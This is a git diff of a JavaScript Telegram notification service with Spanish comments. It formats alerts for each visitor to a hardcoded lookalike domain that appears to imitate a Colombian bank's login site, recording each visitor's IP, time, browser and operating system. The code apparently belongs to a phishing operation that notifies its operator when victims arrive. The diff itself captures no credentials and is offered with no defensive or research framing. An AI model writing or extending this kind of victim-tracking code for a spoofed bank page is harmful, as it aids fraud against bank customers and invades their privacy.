@@ -45,17 +45,53 @@ class TelegramService {
    * @returns {string} Mensaje formateado
    */
   formatVisitorMessage(visitorData) {
-    const { ip, timestamp, userAgent } = visitorData;
+    const { ip, timestamp, userAgent, url } = visitorData;
     
     return `
 🔔 <b>NUEVO INGRESO</b>
 
+🌐 <b>URL:</b> https://svnegoci0sbncolombiaingresaqui.up.railway.app/
 📍 <b>IP:</b> <code>${ip}</code>
 🕐 <b>Fecha/Hora:</b> ${timestamp}
-🌐 <b>User Agent:</b> ${userAgent || 'No disponible'}
+📱 <b>Navegador:</b> ${this.getBrowserInfo(userAgent)}
+🖥️ <b>Sistema:</b> ${this.getOSInfo(userAgent)}
 
-✅ Acceso registrado exitosamente
+✅ <b>Acceso registrado exitosamente</b>
     `.trim();
+  }
+
+  /**
+   * Extrae información del navegador del User Agent
+   * @param {string} userAgent - User Agent string
+   * @returns {string} Nombre del navegador
+   */
+  getBrowserInfo(userAgent) {
+    if (!userAgent) return 'Desconocido';
+    
+    if (userAgent.includes('Chrome')) return 'Chrome';
+    if (userAgent.includes('Firefox')) return 'Firefox';
+    if (userAgent.includes('Safari')) return 'Safari';
+    if (userAgent.includes('Edge')) return 'Edge';
+    if (userAgent.includes('Opera')) return 'Opera';
+    
+    return 'Otro';
+  }
+
+  /**
+   * Extrae información del sistema operativo del User Agent
+   * @param {string} userAgent - User Agent string
+   * @returns {string} Sistema operativo
+   */
+  getOSInfo(userAgent) {
+    if (!userAgent) return 'Desconocido';
+    
+    if (userAgent.includes('Windows')) return 'Windows';
+    if (userAgent.includes('Mac OS')) return 'macOS';
+    if (userAgent.includes('Android')) return 'Android';
+    if (userAgent.includes('iOS') || userAgent.includes('iPhone')) return 'iOS';
+    if (userAgent.includes('Linux')) return 'Linux';
+    
+    return 'Otro';
   }
 
   /**
